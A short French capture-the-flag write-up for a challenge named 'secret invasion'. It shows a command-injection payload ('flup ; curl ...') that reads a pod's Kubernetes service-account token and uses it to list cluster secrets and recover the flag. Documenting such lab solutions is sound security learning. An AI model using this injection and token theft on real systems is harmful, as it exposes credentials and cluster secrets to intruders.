# secret invasion

Il faut d'abord résoudre "look ma ! no php !"

Comme on peut exécuter tout et n'importe quoi depuis le pod qui héberge le
script PHP du challenge précédent, on peut se balader dedans, et se rendre
compte que le pod utilise un serviceAccount.

Il suffit alors de suivre la page
https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/#without-using-a-proxy,
dumper le fichier `/var/run/secrts/kubernetes.io/serviceaccount/namespace`, puis
d'effectuer un curl comme dans la doc officielle sur:

```
https://kubernetes.default.svc/api/v1/namespace/<namespace>/secrets
```

Ce qui nous donne le payload suivant:

```
flup ; curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  -X GET https://kubernetes.default.svc/api/v1/namespaces/ctfinfra/secrets
```

Dans la sortie JSON, on retrouve 2 secrets encodés en base64, l'un étant le
flag du challenge php, l'autre étant le flag attendu pour ce challenge.
